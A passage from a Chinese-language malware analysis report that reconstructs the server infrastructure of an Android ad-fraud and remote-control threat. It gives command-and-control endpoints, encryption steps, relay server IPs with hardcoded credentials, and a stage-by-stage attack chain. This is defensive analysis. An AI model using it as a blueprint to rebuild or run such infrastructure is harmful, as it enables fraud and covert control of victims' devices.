│   ├── 信令/非信令模式分发: 根据 CheckSignalingPluginStart 结果决定
│   ├── JS 脚本版本管理: 支持增量更新
│   └── 设备配额/频率控制: 6小时冷却机制(客户端)
│
└── 数据存储
    ├── 设备注册信息 (15字段设备指纹)
    ├── 认证 Token 管理
    ├── Offer/Job 配置
    ├── JS 脚本仓库 (多版本)
    └── 事件/日志数据仓库
```

### 14.4 服务器 ③：信令服务器 (WebSocket)

#### 推断技术栈

| 属性 | 值 | 推断依据 |
|------|---|---------|
| **协议** | WebSocket (ws:// 或 wss://) | SignalingConnection 使用 WebSocket 客户端 |
| **URL** | C&C 动态下发 | CheckSignalingPluginStartResponse.ws_url |
| **消息格式** | JSON (类 Protobuf 结构) | SignalingRequest/Response 类定义 |
| **心跳** | Ping/Pong 机制，30 秒间隔 | SignalingConfig.pingIntervalSec = 30L |
| **超时** | 60 秒无响应断连 | WebSocket 基类超时配置 |

#### 必须实现的功能

```
WebSocket Signaling Server
│
├── 连接管理
│   ├── WebSocket 握手 + 认证 (auth token)
│   ├── 房间管理 (join/leave)
│   ├── 心跳检测: Ping → Pong (30 秒间隔)
│   └── 连接丢失检测: 60 秒超时 → close(1006)
│
├── 消息路由 (手机 ↔ 攻击者控制端)
│   │
│   ├── 手机 → 服务器 (SignalingRequest)
│   │   ├── type: "sdp_answer"      → 转发 SDP Answer 给控制端
│   │   ├── type: "ice_candidate"   → 转发 ICE Candidate 给控制端
│   │   └── type: "ping"            → 回复 Pong
│   │
│   ├── 控制端 → 服务器 → 手机 (SignalingResponse)
│   │   ├── type: "sdp_offer"       → 转发 SDP Offer 给手机
│   │   ├── type: "ice_candidate"   → 转发 ICE Candidate 给手机
│   │   ├── type: "status"          → 连接状态通知
│   │   ├── type: "pong"            → 心跳响应
│   │   └── type: "done"            → 会话结束
│   │
│   └── 服务器 → 手机 (主动推送)
│       └── type: "error"           → 错误通知 (code + message)
│
├── HTTP RPC 端点 (非 WebSocket)
│   │
│   ├── CheckSignalingPluginStart
│   │   ├── 请求: {atom: Atom}
│   │   ├── 处理: 判断设备是否应启动信令模式
│   │   └── 响应: {code, message, run, offerId, jobId}
│   │
│   └── UpdateSignalingStatus
│       ├── 请求: {atom, jobId, status, url}
│       ├── status 枚举:
│       │   ├── IN_LANDING          — 正在加载着陆页
│       │   ├── SIGNALING_CONNECTED — 信令连接已建立
│       │   ├── SIGNALING_FAILED    — 信令连接失败
│       │   ├── PEER_CONNECTED      — WebRTC 对等连接已建立
│       │   ├── PEER_DISCONNECTED   — WebRTC 断开
│       │   └── PEER_FAILED         — WebRTC 连接失败
│       └── 响应: {code, message}
│
└── 攻击者控制端接口 (Web UI 推断)
    ├── 设备列表查看 (在线/离线)
    ├── 发起 SDP Offer (建立远程控制)
    ├── 发送 ICE Candidate
    ├── 实时屏幕查看 (WebRTC VideoTrack)
    └── 发送控制命令 (通过 DataChannel)
        ├── click(normalizedX, normalizedY)
        ├── drag(startX, startY, endX, endY)
        ├── scroll(deltaX, deltaY)
        ├── paste(text) / input(text)
        ├── keyInput(keyCode)
        ├── goBack / close / release
        └── screenshot (请求截图)
```

#### 信令消息格式

```json
// SignalingRequest (手机 → 服务器)
{
  "atom": { /* 设备指纹 */ },
  "content": {
    "type": "sdp_answer",       // 内容类型鉴别器
    "sdp_answer": {             // 具体载荷
      "type": "answer",
      "sdp": "v=0\r\n..."
    }
  }
}

// SignalingResponse (服务器 → 手机)
{
  "content": {
    "type": "sdp_offer",        // 内容类型鉴别器
    "sdp_offer": {
      "type": "offer",
      "sdp": "v=0\r\n..."
    }
  }
}
```

### 14.5 服务器 ④：TURN 中继服务器

#### 服务器配置

| 属性 | 服务器 1 | 服务器 2 |
|------|---------|---------|
| **IP** | 101.36.120.3 | 106.75.153.105 |
| **端口** | 3478 (UDP) | 3478 (UDP) |
| **协议** | TURN (RFC 5766) | TURN (RFC 5766) |
| **用户名** | wumitech | wumitech |
| **密码** | wumitech.com@123 | wumitech.com@123 |
| **云服务商** | UCloud | UCloud |
| **地理位置** | 香港 | 上海 |
| **STUN 探测** | UDP 开放，无 STUN 响应 | STUN Binding Success ✓ |
| **运营域名** | wumitech.com | wumitech.com |

#### TURN 服务器在攻击链中的作用

```
TURN 服务器功能:
├── NAT 穿透: 手机在 NAT 后面，无法直连 → TURN 作为中继
├── 流量中转: 所有 WebRTC 媒体流和数据通道流量经 TURN 转发
│   ├── VideoTrack (上行): 手机 → TURN → 攻击者 (15fps 屏幕画面)
│   └── DataChannel (双向): 攻击者 → TURN → 手机 (控制指令)
├── 双机冗余: 两台服务器提供高可用性
│   ├── ICE 协商时同时探测两台
│   └── 主服务器不可用时自动切换
└── 凭据认证: 静态 long-term credentials (非 TURN REST API)
```

### 14.6 服务器 ⑤：CDN 文件分发

| 属性 | 值 |
|------|---|
| **域名** | `app-download.cn-wlcb.ufileos.com` |
| **云服务** | UCloud UFile (对象存储) |
| **路径** | `/dllpgd_plugin/ai_model/` |
| **内容** | TFLite AI 模型 + JS 模型分片 |
| **用途** | 广告元素识别模型，辅助自动化点击 |

### 14.7 服务端实现流程总览

#### 完整攻击链时序

```
阶段 1: 设备注册与配置 (C&C 配置服务器)
──────────────────────────────────────
  手机 ── POST /api/v1/dllpgd/getConfig ──→ dllpgd.click
  服务端:
    1. 解密请求: Base64 → AES-256-CFB → Base64 → GZIP → JSON
    2. 解析 Atom 设备指纹
    3. 查询设备配置:
       - 分配 sessionId
       - 查询适用的插件列表 (needRun, needUpdate)
       - 设置反分析参数 (hookPkgNameStackTraces)
    4. 加密响应: JSON → GZIP → Base64 → AES → Base64
    5. 返回 GetConfigResponse {plugins[], sessionId, ...}

阶段 2: 认证与任务分配 (C&C API 服务器)
──────────────────────────────────────
  手机 ── POST /phantom/token ──→ playstations.click
  服务端:
    1. 解析 DeviceAuthRequest (含 15 字段设备指纹)
    2. 验证/注册设备
    3. 生成 auth token
    4. 下发 XOR 加密密钥 (后续通信加密)
    5. 返回 TokenResponse {code:0, content: "token_xxx"}

  手机 ── POST /phantom/task ──→ playstations.click
  服务端:
    1. 根据设备指纹匹配广告任务
    2. 确定信令/非信令模式
    3. 返回任务配置 (site_url, offer_id, job_id)

阶段 3: 信令模式判定
──────────────────
  手机 ── CheckSignalingPluginStart ──→ 信令服务器
  服务端:
    1. 评估设备是否适合远程控制 (网络质量、设备能力)
    2. 分配 offerId + jobId
    3. 返回 {code:0, run:true/false, offerId, jobId}

  (如果 run=true) 手机 ── POST /h5/get_job_by_offer ──→ playstations.click
  服务端:
    1. 查找 offer 关联的完整任务配置
    2. 返回: site_url + 信令服务器 WebSocket URL + TURN/STUN 配置

阶段 4: JS 注入脚本获取
────────────────────
  手机 ── POST /phantom/file_version ──→ playstations.click
  服务端:
    1. 查询当前 JS 版本号
    2. 返回 FileVersionResponse {version: "v2.3.1"}

  (版本不同时) 手机 ── POST /phantom/file ──→ playstations.click
  服务端:
    1. 返回最新 JS 注入脚本 (完整内容)
    2. 客户端缓存到本地文件

阶段 5: 信令连接建立
──────────────────
  手机 ── WebSocket connect ──→ 信令服务器
  服务端:
    1. 验证 auth token
    2. 创建 WebSocket 会话
    3. 将设备加入待控制队列
    4. 通知攻击者控制端: 新设备上线

  手机 ── join(room) ──→ 信令服务器
  服务端:
    1. 将设备绑定到房间
    2. 启动心跳监控 (30 秒 ping/pong)

阶段 6: WebRTC 连接建立 (攻击者发起)
──────────────────────────────────
  攻击者 ── SDP Offer ──→ 信令服务器 ──→ 手机
  服务端 (信令):
    1. 收到攻击者的 SDP Offer
    2. 转发给目标设备

  手机 ── SDP Answer ──→ 信令服务器 ──→ 攻击者
  服务端 (信令):
    1. 收到设备的 SDP Answer
    2. 转发给攻击者

  双方 ── ICE Candidate ──→ 信令服务器 ──→ 对方
  服务端 (信令):
    1. 双向转发 ICE 候选
    2. 直到 WebRTC P2P/TURN 连接建立

  TURN 服务器:
    1. 收到 TURN Allocate 请求
    2. 验证 long-term credentials (wumitech / wumitech.com@123)
    3. 分配中继地址 (Relayed Transport Address)
    4. 建立双向中继通道

阶段 7: 远程控制会话
──────────────────
  (WebRTC 连接建立后，直接 P2P/TURN 通信，不再经过信令服务器)

  手机 ── VideoTrack ──→ TURN ──→ 攻击者
    15fps WebView 屏幕画面实时推流

  攻击者 ── DataChannel ──→ TURN ──→ 手机
    控制指令: click/drag/scroll/paste/input/keyInput/goBack/close/release

  手机 ── UpdateSignalingStatus ──→ 信令服务器
    状态上报: IN_LANDING → PEER_CONNECTED → DONE

阶段 8: 任务完成与循环
──────────────────
  手机 ── POST /phantom/done ──→ playstations.click
  服务端:
    1. 记录任务完成 (offerId, result)
    2. 更新计费统计

  手机 ── POST /h5/report_events ──→ playstations.click
  手机 ── POST /h5/upload_logs_v2 ──→ playstations.click
  服务端:
    1. 批量存储事件/日志
    2. 用于运营分析和欺诈效果统计

  等待 30 分钟后 → 回到阶段 2 开始新任务
```

### 14.8 服务端关键设计特征

| 特征 | 说明 |
|------|------|
| **双 C&C 分离** | 配置服务器 (dllpgd.click) 和 API 服务器 (playstations.click) 分离部署，降低单点被封风险 |
| **动态加密密钥** | XOR 加密密钥由服务端在 token 阶段动态下发，每个设备可使用不同密钥 |
| **信令 URL 动态下发** | 信令服务器 URL 不硬编码，由 C&C 在 get_job_by_offer 中返回，便于快速更换 |
| **TURN 凭据静态** | TURN 使用 long-term credentials (硬编码在客户端)，简化部署但安全性较低 |
| **多云部署** | AWS (美东) + UCloud (香港/上海)，跨云跨地域分散基础设施 |
| **插件系统** | 通过 C&C 配置服务器可动态下发加密的 .dex 插件，实现远程代码更新 |
| **A/B 模式** | 信令/非信令双模式设计，服务端可按设备灵活选择操作模式 |
| **反取证协作** | 客户端 92% 概率清理痕迹，服务端不在响应中留存可识别标记 |
